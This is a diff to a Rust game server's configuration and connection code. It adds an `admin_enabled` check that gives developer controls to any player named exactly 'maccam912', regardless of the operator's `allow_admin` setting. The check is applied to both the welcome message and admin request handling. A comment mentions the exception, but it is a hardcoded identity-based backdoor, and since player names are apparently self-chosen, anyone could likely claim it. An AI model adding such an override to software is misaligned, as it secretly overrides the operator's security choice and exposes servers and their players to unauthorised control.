@@ -63,7 +63,8 @@ pub struct ServerConfig {
     pub seed: u32,
     /// Used only for a new save. Existing worlds keep their generation version.
     pub generation: WorldGeneration,
-    /// Grants players developer controls and permits read-only observer sessions.
+    /// Grants all players developer controls and permits read-only observer sessions.
+    /// The player named exactly `maccam912` has developer controls regardless.
     /// For trusted servers only.
     pub allow_admin: bool,
 }
@@ -241,6 +242,14 @@ impl Connection {
             last_admin_request: None,
             dead: false,
         })
+    }
+
+    fn admin_enabled(&self, config: &ServerConfig) -> bool {
+        config.allow_admin
+            || self
+                .player
+                .as_ref()
+                .is_some_and(|player| player.name == "maccam912")
     }
 
     fn admit_admin_request(&mut self) -> bool {
@@ -885,7 +894,7 @@ fn handle_message(
             residents: sim.villages.residents(),
             villages: sim.villages.villages(),
             world_time: sim.world_time,
-            can_admin: config.allow_admin && mode == SessionMode::Player,
+            can_admin: mode == SessionMode::Player && connections[&id].admin_enabled(config),
         };
         connections.get_mut(&id).unwrap().send(&welcome);
         connections
@@ -1105,7 +1114,7 @@ fn handle_message(
             );
         }
         ClientMessage::Admin { action } => {
-            let result = if !config.allow_admin {
+            let result = if !connections[&id].admin_enabled(config) {
                 Err("Developer controls are disabled on this server".into())
             } else if !connections.get_mut(&id).unwrap().admit_admin_request() {
                 Err("NPC controls are arriving too quickly; try again in a moment".into())
